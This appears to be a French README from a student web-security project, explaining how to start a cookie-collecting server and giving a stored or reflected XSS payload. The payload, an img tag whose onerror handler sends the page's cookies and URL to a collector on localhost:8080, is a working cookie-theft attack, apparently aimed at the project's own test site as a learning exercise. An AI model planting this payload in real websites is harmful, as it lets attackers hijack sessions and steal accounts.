# Lancement d'un récupérateur de cookies
## serveur d'attaque
1. Créer un dossier se nommant `resultats_attaques` dans `projet-site-securise/ATTAQUES/xss/`
2. Se placer dans `projet-site-securise/ATTAQUES/xss/` et lancer un terminal ici.
3. Exécuter avec python le script `serveur_xss.py`
## Utilisation de l'attaque
Le fonctionnement est tel décrit sur le [Google Docs «réalisation des attaques sur le site»](https://docs.google.com/document/d/1wYIdYXTzjgw3fN62__UIXJCGjMx2iFbdS81DxBEk3H4/edit#heading=h.aqvvpr48nmsg)
L'injection XSS passe par ceci : 
```
<img src="blabla" onerror=window.location.href="http://localhost:8080/URLSITERECHERCHE".replace('RECHERCHE',JSON.stringify(document.cookie)).replace('URL',JSON.stringify(document.URL))>
```
